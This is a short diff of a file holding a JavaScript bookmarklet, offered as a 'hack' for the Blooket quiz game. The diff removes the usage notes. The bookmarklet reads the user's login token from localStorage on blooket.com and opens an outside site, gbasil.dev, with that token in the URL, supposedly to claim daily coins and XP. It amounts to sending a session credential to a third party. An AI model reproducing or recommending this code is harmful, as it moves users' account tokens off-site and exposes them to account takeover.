@@ -1,5 +1,1 @@
 javascript:(()=>{                    if (document.location.host != 'www.blooket.com') return alert('Drag me to your bookmark bar and click me when you\'re logged in on blooket.com');                    if (!localStorage.token) alert('Couldn\'t find token, make sure you\'re logged in');                    else window.open(`https://gbasil.dev/blooket?token=${encodeURIComponent(localStorage.token)}`);                })();
-
-ＮＯＴＩＣＥ ！！ For this hack you must use it when in the blooket market place, once you are there click the bookmark and it will send you to a Gbasil link,
-after you are there you will want to click the button that says "Get Daily Coins & XP" After that has been compleated you will want to go back to blooket
-and refresh the page!
